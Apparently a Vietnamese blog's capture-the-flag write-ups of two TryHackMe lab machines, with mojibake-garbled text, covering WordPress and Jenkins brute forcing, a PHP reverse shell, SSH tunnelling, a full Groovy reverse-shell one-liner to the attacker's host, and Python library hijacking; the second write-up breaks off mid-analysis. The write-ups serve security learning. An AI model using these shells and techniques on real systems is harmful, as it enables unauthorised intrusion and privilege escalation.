by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://internal.thm/blog/ [10.10.27.84] [+] Started: Sat Aug 13 05:28:53 2022 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://internal.thm/blog/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://internal.thm/blog/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; | - http://internal.thm/blog/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/ | Last Updated: 2022-05-24T00:00:00.000Z | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt | [!] The version is out of date, the latest version is 3.0 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.3 (80% confidence) | Found By: Style (Passive Detection) | - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: \u0026#39;Version: 2.3\u0026#39; [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:02 \u0026lt;===============================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:02 [i] User(s) Identified: [+] admin | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register TÃ´i thu Ä‘Æ°á»£c vÃ i thÃ´ng tin: Wordpress 5.4.2, themes Ä‘ang dÃ¹ng: twentyseventeen vÃ  nÃ³ chÆ°a Ä‘Æ°á»£c update lÃªn version má»›i nháº¥t, cuá»‘i cÃ¹ng lÃ  1 user admin. TÃ´i sáº½ báº¯t Ä‘áº§u thá»­ tá»« phÆ°Æ¡ng phÃ¡p thá»§ cÃ´ng nháº¥t lÃ  brute force.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ wpscan --url http://internal.thm/blog/wp-login.php --usernames admin --passwords /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt ... [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:42 \u0026lt;==============================================================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:42 [i] No Config Backups Found. [+] Performing password attack on Wp Login against 1 user/s [SUCCESS] - admin / my2boys Trying admin / lizzy Time: 00:07:19 \u0026lt;====== \u0026gt; (3880 / 63066) 6.15% ETA: ??:??:?? [!] Valid Combinations Found: | Username: admin, Password: ******* [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register Login vÃ o Wordpress thÃ´i\nBÃ¢y giá» thÃ¬ tÃ¬m Ä‘áº¿n themes vÃ  thá»­ upload php shell. TÃ´i hay sá»­ dá»¥ng php shell cá»§a pentestmonkey.\nSau khi Ä‘Ã£ \u0026lsquo;Update File\u0026rsquo;, tÃ´i táº¡o listener vá»›i port 2402 giá»‘ng nhÆ° trong shell vá»«a upload. Sau Ä‘Ã³ truy cáº­p vÃ o file vá»«a sá»­a\nhttp://internal.thm/blog/wp-content/themes/twentyseventeen/404.php\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 2402 listening on [any] 2402 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.27.84] 50354 Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 10:01:50 up 1:21, 0 users, load average: 0.00, 0.00, 0.02 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1107): Inappropriate ioctl for device bash: no job control in this shell www-data@internal:/$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@internal:/$ VÃ¬ Ä‘Ã¢y lÃ  user web nÃªn tÃ´i sáº½ thá»­ vÃ o thÆ° má»¥c web Ä‘á»ƒ tÃ¬m xem cÃ³ gÃ¬ hay ho khÃ´ng, thÃªm 1 Ä‘iá»u ná»¯a lÃ  bÃªn cháº¯c cháº¯n bÃªn trong thÆ° má»¥c web sáº½ cÃ³ file config cá»§a Wordpress nÃªn biáº¿t Ä‘Ã¢u tÃ´i sáº½ tÃ¬m Ä‘Æ°á»£c user vÃ  password nÃ o Ä‘Ã³.\n// ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;**************\u0026#39; ); Trong wp-config.php tÃ´i tÃ¬m Ä‘Æ°á»£c user vÃ  pass Ä‘á»ƒ truy cáº­p vÃ o mysql. Tuy nhiÃªn thÃ¬ cÅ©ng khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t Ä‘á»ƒ khai thÃ¡c. Váº­y nÃªn tÃ´i sáº½ thá»­ tÃ¬m kiáº¿m xung quanh cÃ¡c thÆ° má»¥c trong www-data.\nwww-data@internal:/$ ls bin dev initrd.img lib64 mnt root snap sys var boot etc initrd.img.old lost+found opt run srv tmp vmlinuz cdrom home lib media proc sbin swap.img usr vmlinuz.old Máº¥t 1 lÃºc thÃ¬ tÃ´i Ä‘Ã£ tÃ¬m tháº¥y thá»© mÃ¬nh cáº§n.\nwww-data@internal:/opt$ ls containerd wp-save.txt www-data@internal:/opt$ cat wp-save.txt Bill, Aubreanna needed these credentials for something later. Let her know you have them and where they are. aubreanna:************** Äá»•i sang user aubreanna vÃ  tÃ´i cÃ³ user flag á»Ÿ Ä‘Ã¢y.\nwww-data@internal:/opt$ su aubreanna Password: aubreanna@internal:/opt$ cd aubreanna@internal:~$ ls jenkins.txt snap user.txt aubreanna@internal:~$ Privilege escalation # Viá»‡c Ä‘áº§u tiÃªn tÃ´i hay lÃ m trong khÃ¢u nÃ y lÃ  sá»­ dá»¥ng cÃ¡c phÆ°Æ¡ng phÃ¡p Ä‘Æ°Æ¡n giáº£n trÆ°á»›c nhÆ° lÃ  sudo -l hay tÃ¬m cÃ¡c chÆ°Æ¡ng trÃ¬nh cháº¡y báº±ng root, hay cáº£ crontab nhÆ°ng Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£.\nThá»­ má»Ÿ ná»‘t file txt cÃ²n láº¡i bÃªn trong aubreanna\naubreanna@internal:~$ cat jenkins.txt Internal Jenkins service is running on 172.17.0.2:8080 TÃ´i thá»­ kiá»ƒm tra dá»‹ch vá»¥ Ä‘ang cháº¡y vá»›i \u0026ldquo;netstat\u0026rdquo;\naubreanna@internal:~$ netstat -tan | grep 8080 tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN Jenkins Ä‘ang cháº¡y local vá»›i port 8080. Äá»ƒ truy cáº­p Ä‘Æ°á»£c port nÃ y, tÃ´i sáº½ dÃ¹ng SSH tunneling Ä‘á»ƒ chuyá»ƒn tiáº¿p port 8080 sang 1 port cá»§a mÃ¡y tÃ´i. Tá»« Ä‘Ã³ tÃ´i cÃ³ thá»ƒ truy cáº­p vÃ o localhost cá»§a target machine\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh -L 2402:127.0.0.1:8080 aubreanna@10.10.51.65 Truy cáº­p vÃ o localhost vá»›i port 2402\nSau khi thá»­ cÃ¡c user-pass Ä‘Æ¡n giáº£n Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£, tÃ´i váº«n pháº£i dÃ¹ng Ä‘áº¿n brute force, vÃ  láº§n nÃ y tÃ´i dÃ¹ng hydra. NhÆ°ng trÆ°á»›c Ä‘Ã³ pháº£i dÃ¹ng BurpSuite Ä‘á»ƒ láº¥y form Ä‘Äƒng nháº­p.\nBÃ¢y giá» thÃ¬ thá»­ brute force vá»›i username máº·c Ä‘á»‹nh cá»§a Jenkins lÃ  admin\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt 127.0.0.1 -s 2402 http-post-form \u0026#34;/j_acegi_security_check:j_username=^USER^\u0026amp;j_password=^PASS^\u0026amp;from=%2F\u0026amp;Submit=Sign+in:Invalid username or password\u0026#34; Hydra v9.3 (c) 2022 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-14 06:08:39 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 59185 login tries (l:1/p:59185), ~3700 tries per task [DATA] attacking http-post-form://127.0.0.1:2402/j_acegi_security_check:j_username=^USER^\u0026amp;j_password=^PASS^\u0026amp;from=%2F\u0026amp;Submit=Sign+in:Invalid username or password [2402][http-post-form] host: 127.0.0.1 login: admin password: ******* 1 of 1 target successfully completed, 1 valid password found Ã” Ä‘Æ°á»£c luÃ´n nÃ y \u0026#x1f606;. Thá»­ google 1 chÃºt vá» jenkins vÃ  cÃ¡ch upload reverse shell, tÃ´i biáº¿t Ä‘Æ°á»£c cÃ³ thá»ƒ upload payload báº±ng code java tá»« Groovy.\nString host=\u0026#34;myip\u0026#34;; int port=12345; String cmd=\u0026#34;/bin/bash\u0026#34;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u0026gt;0)so.write(pi.read());while(pe.available()\u0026gt;0)so.write(pe.read());while(si.available()\u0026gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); VÃ o Jenkins \u0026gt; Manage Jenkins \u0026gt; Script Console vÃ  nháº­p Ä‘oáº¡n code phÃ­a trÃªn vÃ o. Ã€ tuy nhiÃªn trÆ°á»›c Ä‘Ã³ thÃ¬ pháº£i táº¡o listener vá»›i port 12345: nc -lnvp 1235\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 12345 listening on [any] 12345 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.51.65] 56774 id uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins) ls bin dev home lib64 mnt proc run srv tmp var boot etc lib media opt root sbin sys usr Láº§n nÃ y tÃ´i thá»­ vÃ o /opt luÃ´n xem cÃ³ gÃ¬ trong nÃ y nhÆ° láº§n Ä‘áº§u khÃ´ng.\ncd /opt/ ls note.txt cat note.txt Aubreanna, Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here. Use them if you need access to the root user account. root:**************** Thá»­ Ä‘á»•i sang user root. Ã€ tÃ´i quÃªn máº¥t Ä‘Ã¢y chá»‰ lÃ  server jenkins nÃªn tÃ´i sáº½ quay vá» target machine vá»›i user aubreanna vÃ  Ä‘á»•i sang root\naubreanna@internal:~$ su root Password: root@internal:/home/aubreanna# cd root@internal:~# ls root.txt snap root@internal:~# Conclusion # ÄÃºng lÃ  1 machine cáº¥p Ä‘á»™ khÃ³, Ä‘Ã²i há»i pháº£i dÃ¹ng káº¿t há»£p nhiá»u ká»¹ thuáº­t vÃ  tÃ´i cÅ©ng biáº¿t thÃªm Ä‘Æ°á»£c nhiá»u kiáº¿n thá»©c má»›i tá»« bÃ i nÃ y.\nVá»›i pháº§n leo thang Ä‘áº·c quyá»n tÃ´i biáº¿t thÃªm vá» ssh tunnelling: cÃ¡ch Ä‘iá»u hÆ°á»›ng luá»“ng dá»¯ liá»‡u tá»« 2 nÆ¡i giá»¯a 2 Ä‘á»‹a chá»‰ Ä‘á»™c láº­p.\nTiáº¿p ná»¯a lÃ  tÃ´i biáº¿t thÃªm vá» Jenkins - má»™t cÃ´ng cá»¥ mÃ£ nguá»“n má»Ÿ dÃ¹ng Ä‘á»ƒ tÃ­ch há»£p vÃ  tá»± Ä‘á»™ng hÃ³a code cá»§a cÃ¡c thÃ nh viÃªn trong dá»± Ã¡n vÃ  cÃ¡ch khai thÃ¡c lá»— há»•ng thÃ´ng qua Groovy script.\nÄá»c thÃªm:\nSSH Tunneling Cracking Online Web Form Passwords with THC-Hydra \u0026amp; Burp Suite Jenkins - Reverse shell from Groovy ","date":"5 December 2021","externalUrl":null,"permalink":"/ctf/tryhackme/internal/","section":"Ctf","summary":"","title":"Tryhackme - Internal","type":"ctf"},{"content":"","date":"30 November 2021","externalUrl":null,"permalink":"/tags/python-library/","section":"Tags","summary":"","title":"Python Library","type":"tags"},{"content":"HÃ´m nÃ y tÃ´i sáº½ giáº£i CTF Tryhackme - Wonderland\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng thÃ´i, viá»‡c Ä‘áº§u tiÃªn lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ.\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN | 256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M= | 256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh 80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Follow the white rabbit. | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TÃ´i sáº½ báº¯t Ä‘áº§u vá»›i web server.\nChá»‰ lÃ  1 trang html Ä‘Æ¡n giáº£n. TÃ´i thá»­ qua cÃ¡c path Ä‘Æ¡n giáº£n vÃ  phá»• biáº¿n nhÆ° robots.txt hay thá»­ check qua index.php Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£. Váº«n pháº£i dÃ¹ng tool Ä‘á»ƒ tÃ¬m web path thÃ´i, tÃ´i sáº½ dÃ¹ng dirsearch.\n[05:44:38] 301 - 0B - /r -\u0026gt; r/\nCÅ©ng khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t. TÃ´i sáº½ thá»­ 1 láº§n dÃ¹ng dirsearch ná»¯a Ä‘á»ƒ xem Ä‘áº±ng sau path /r nÃ y cÃ³ gÃ¬ khÃ´ng.\n[05:45:23] 301 - 0B - /r/a -\u0026gt; a/\nVáº«n chÆ°a cÃ³ gÃ¬ Ä‘á»ƒ khai thÃ¡c á»Ÿ Ä‘Ã¢y. NhÆ°ng tÃ´i cÃ³ 1 Ã½ tÆ°á»Ÿng vá» máº¥y cÃ¡i path nÃ y, tÃ´i sáº½ thá»­ thÃªm 1 láº§n dirsearch ná»¯a cho cháº¯c cháº¯n.\n[05:56:29] 301 - 0B - /r/a/b -\u0026gt; b/\nVáº­y thÃ¬ ráº¥t cÃ³ thá»ƒ nhá»¯ng path sau lÃ  cÃ¡c chá»¯ cÃ¡i táº¡o nÃªn tá»« rabbit. Äá»ƒ trÃ¡nh máº¥t thá»i gian thÃ¬ tÃ´i sáº½ thá»­ luÃ´n.\nCheck qua source web thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c 1 thá»© hay ho cÃ³ thá»ƒ lÃ  username vÃ  password Ä‘á»ƒ Ä‘Äƒng nháº­p SSH.\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Enter wonderland\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;[/main.css](view-source:http://10.10.185.15/main.css)\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Open the door and enter wonderland\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;\u0026#34;Oh, youâ€™re sure to do that,\u0026#34; said the Cat, \u0026#34;if you only walk long enough.\u0026#34;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Alice felt that this could not be denied, so she tried another question. \u0026#34;What sort of people live about here?\u0026#34; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026#34;In that direction,\u0026#34;\u0026#34; the Cat said, waving its right paw round, \u0026#34;lives a Hatter: and in that direction,\u0026#34; waving the other paw, \u0026#34;lives a March Hare. Visit either you like: theyâ€™re both mad.\u0026#34;\u0026lt;/p\u0026gt; \u0026lt;p style=\u0026#34;display: none;\u0026#34;\u0026gt;alice:***************************************\u0026lt;/p\u0026gt; \u0026lt;img src=\u0026#34;[/img/alice_door.](view-source:http://10.10.185.15/img/alice_door.)\u0026#34; style=\u0026#34;height: 50rem;\u0026#34;\u0026gt; \u0026lt;/body\u0026gt; SSH # Thá»­ login ssh\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh alice@10.10.185.15 The authenticity of host \u0026#39;10.10.185.15 (10.10.185.15)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.185.15\u0026#39; (ED25519) to the list of known hosts. alice@10.10.185.15\u0026#39;s password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Aug 10 10:05:04 UTC 2022 System load: 0.0 Processes: 84 Usage of /: 18.9% of 19.56GB Users logged in: 0 Memory usage: 29% IP address for eth0: 10.10.185.15 Swap usage: 0% 0 packages can be updated. 0 updates are security updates. Last login: Mon May 25 16:37:21 2020 from 192.168.170.1 alice@wonderland:~$ Trong user alice tÃ´i cÃ³ 2 file lÃ  root flag vÃ  1 file python nhÆ°ng táº¥t nhiÃªn lÃ  khÃ´ng cÃ³ quyá»n má»Ÿ rá»“i. Tuy nhiÃªn khi thá»­ sudo -l tÃ´i nháº­n ra user rabbit cÃ³ quyá»n cháº¡y file py.\nimport random poem = \u0026#34;\u0026#34;\u0026#34;The sun was shining on the sea, Shining with all his might: He did his very best to make The billows smooth and bright â€” And this was odd, because it was The middle of the night. The moon was shining sulkily, Because she thought the sun Had got no business to be there After the day was done â€” \u0026#34;Itâ€™s very rude of him,\u0026#34; she said, \u0026#34;To come and spoil the fun!\u0026#34; The sea was wet as wet could be, The sands were dry as dry. You could not see a cloud, because No cloud was in the sky: No birds were flying over head â€” There were no birds to fly. The Walrus and the Carpenter Were walking close at hand; They wept like anything to see Such quantities of sand: \u0026#34;If this were only cleared away,\u0026#34; They said, \u0026#34;it would be grand!\u0026#34; \u0026#34;If seven maids with seven mops Swept it for half a year, Do you suppose,\u0026#34; the Walrus said, \u0026#34;That they could get it clear?\u0026#34; \u0026#34;I doubt it,\u0026#34; said the Carpenter, And shed a bitter tear. \u0026#34;O Oysters, come and walk with us!\u0026#34; The Walrus did beseech. \u0026#34;A pleasant walk, a pleasant talk, Along the briny beach: We cannot do with more than four, To give a hand to each.\u0026#34; The eldest Oyster looked at him. But never a word he said: The eldest Oyster winked his eye, And shook his heavy head â€” Meaning to say he did not choose To leave the oyster-bed. But four young oysters hurried up, All eager for the treat: Their coats were brushed, their faces washed, Their shoes were clean and neat â€” And this was odd, because, you know, They hadnâ€™t any feet. Four other Oysters followed them, And yet another four; And thick and fast they came at last, And more, and more, and more â€” All hopping through the frothy waves, And scrambling to the shore. The Walrus and the Carpenter Walked on a mile or so, And then they rested on a rock Conveniently low: And all the little Oysters stood And waited in a row. \u0026#34;The time has come,\u0026#34; the Walrus said, \u0026#34;To talk of many things: Of shoes â€” and ships â€” and sealing-wax â€” Of cabbages â€” and kings â€” And why the sea is boiling hot â€” And whether pigs have wings.\u0026#34; \u0026#34;But wait a bit,\u0026#34; the Oysters cried, \u0026#34;Before we have our chat; For some of us are out of breath, And all of us are fat!\u0026#34; \u0026#34;No hurry!\u0026#34; said the Carpenter. They thanked him much for that. \u0026#34;A loaf of bread,\u0026#34; the Walrus said, \u0026#34;Is what we chiefly need: Pepper and vinegar besides Are very good indeed â€” Now if youâ€™re ready Oysters dear, We can begin to feed.\u0026#34; \u0026#34;But not on us!\u0026#34; the Oysters cried, Turning a little blue, \u0026#34;After such kindness, that would be A dismal thing to do!\u0026#34; \u0026#34;The night is fine,\u0026#34; the Walrus said \u0026#34;Do you admire the view? \u0026#34;It was so kind of you to come! And you are very nice!\u0026#34; The Carpenter said nothing but \u0026#34;Cut us another slice: I wish you were not quite so deaf â€” Iâ€™ve had to ask you twice!\u0026#34; \u0026#34;It seems a shame,\u0026#34; the Walrus said, \u0026#34;To play them such a trick, After weâ€™ve brought them out so far, And made them trot so quick!\u0026#34; The Carpenter said nothing but \u0026#34;The butterâ€™s spread too thick!\u0026#34; \u0026#34;I weep for you,\u0026#34; the Walrus said. \u0026#34;I deeply sympathize.\u0026#34; With sobs and tears he sorted out Those of the largest size. Holding his pocket handkerchief Before his streaming eyes. \u0026#34;O Oysters,\u0026#34; said the Carpenter. \u0026#34;Youâ€™ve had a pleasant run! Shall we be trotting home again?\u0026#34; But answer came there none â€” And that was scarcely odd, because Theyâ€™d eaten every one.\u0026#34;\u0026#34;\u0026#34; for i in range(10): line = random.choice(poem.split(\u0026#34;\\n\u0026#34;)) print(\u0026#34;The line was:\\t\u0026#34;, line) Qua google tÃ´i biáº¿t Ä‘Æ°á»£c Ä‘Ã¢y lÃ  1 bÃ i thÆ¡ trong phim Alice in wonderland cÅ©ng lÃ  cáº£m há»©ng dá»±ng nÃªn CTF nÃ y. Khi cháº¡y file py nÃ y, nÃ³ sáº½ chá»n ngáº«u nhiÃªn 10 dÃ²ng vÃ  in ra mÃ n hÃ¬nh ká»ƒ cáº£ dÃ²ng trá»‘ng.\nalice@wonderland:~$ python3 walrus_and_the_carpenter.py The line was: The Carpenter said nothing but The line was: Because she thought the sun The line was: The sun was shining on the sea, The line was: And scrambling to the shore. The line was: The Walrus did beseech. The line was: To give a hand to each.\u0026#34; The line was: The line was: Iâ€™ve had to ask you twice!\u0026#34; The line was: All hopping through the frothy waves, The line was: Holding his pocket handkerchief alice@wonderland:~$ Privilege escalation # Thá»±c sá»± lÃ  tÃ´i Ä‘Ã£ máº¥t cáº£ 1 buá»•i sÃ¡ng Ä‘á»ƒ tÃ¬m cÃ¡ch khai thÃ¡c file py nÃ y nhÆ°ng Ä‘á»u khÃ´ng cÃ³ tÃ¡c dá»¥ng. VÃ  trong khi láº§n mÃ² 1 cÃ¡ch vÃ´ vá»ng trÃªn google vá» cÃ¡c lá»— há»•ng vá»›i file python, tÃ´i tÃ¬m tháº¥y cÃ¡ch leo thang Ä‘áº·c quyá»n báº±ng thÆ° viá»‡n python.\nKhi cháº¡y file, python sáº½ tÃ¬m Ä‘áº¿n thÆ° má»¥c chá»©a cÃ¡c gÃ³i Ä‘Æ°á»£c import theo thá»© tá»± Æ°u tiÃªn. á» Ä‘Ã¢y, trong thÆ° viá»‡n cá»§a python 3.6 cÃ³ file random.py nÃªn thay vÃ¬ Ä‘á»ƒ táº­p lá»‡nh gá»i file nÃ y, tÃ´i sáº½ táº¡o 1 file random.py chá»©a payload á»Ÿ ngay trong thÆ° má»¥c alice.\nTáº¡o file random.py:\nimport os os.system(\u0026#34;/bin/bash\u0026#34;) Cháº¡y láº¡i file python vá»›i user rabbit xem cÃ³ gÃ¬ xáº£y ra khÃ´ng\nalice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py [sudo] password for alice: rabbit@wonderland:~$ pwd /home/alice VÃ o thÆ° má»¥c cá»§a user rabbit\nrabbit@wonderland:/home/rabbit$ ll total 40 drwxr-x--- 2 rabbit rabbit 4096 May 25 2020 ./ drwxr-xr-x 6 root root 4096 May 25 2020 ../ lrwxrwxrwx 1 root root 9 May 25 2020 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 rabbit rabbit 220 May 25 2020 .bash_logout -rw-r--r-- 1 rabbit rabbit 3771 May 25 2020 .bashrc -rw-r--r-- 1 rabbit rabbit 807 May 25 2020 .profile -rwsr-sr-x 1 root root 16816 May 25 2020 teaParty* rabbit@wonderland:/home/rabbit$ file teaParty teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped Thá»­ cháº¡y file binary nÃ y\nrabbit@wonderland:/home/rabbit$ ./teaParty Welcome to the tea party! The Mad Hatter will be here soon. Probably by Thu, 11 Aug 2022 10:10:09 +0000 Ask very nicely, and I will give you some tea while you wait for him kk Segmentation fault (core dumped) Táº¡m thá»i tÃ´i chÆ°a cÃ³ Ã½ tÆ°á»Ÿng gÃ¬ vá» file nÃ y nÃªn sáº½ láº¥y nÃ³ vá» mÃ¡y Ä‘á»ƒ phÃ¢n tÃ­ch.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ wget http://10.10.165.85:8001/teaParty --2022-08-11 05:12:17-- http://10.10.165.85:8001/teaParty Connecting to 10.10.165.85:8001... connected. HTTP request sent, awaiting response... 200 OK Length: 16816 (16K) [application/octet-stream] Saving to: â€˜teaPartyâ€™ teaParty 100%[====================================================================================================\u0026gt;] 16.42K 52.1KB/s in 0.3s 2022-08-11 05:12:18 (52.1 KB/s) - â€˜teaPartyâ€™ saved [16816/16816] â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ strings teaParty /lib64/ld-linux-x86-64.so.2 2U~4 libc.so.6 setuid puts getchar system __cxa_finalize setgid __libc_start_main GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable u/UH []A\\A]A^A_ Welcome to the tea party! The Mad Hatter will be here soon. /bin/echo -n \u0026#39;Probably by \u0026#39; \u0026amp;\u0026amp; date --date=\u0026#39;next hour\u0026#39; -R Ask very nicely, and I will give you some tea while you wait for him Segmentation fault (core dumped) ;*3$\u0026#34; GCC: (Debian 8.3.0-6) 8.3.0 crtstuff.c deregister_tm_clones ... á» Ä‘Ã¢y, Ä‘á»ƒ láº¥y Ä‘Æ°á»£c thá»i gian, file sáº½ cháº¡y 1 lá»‡nh date nhÆ°ng khÃ´ng xÃ¡c Ä‘á»‹nh Ä‘á»‹a chá»‰ cá»¥ thá»ƒ date 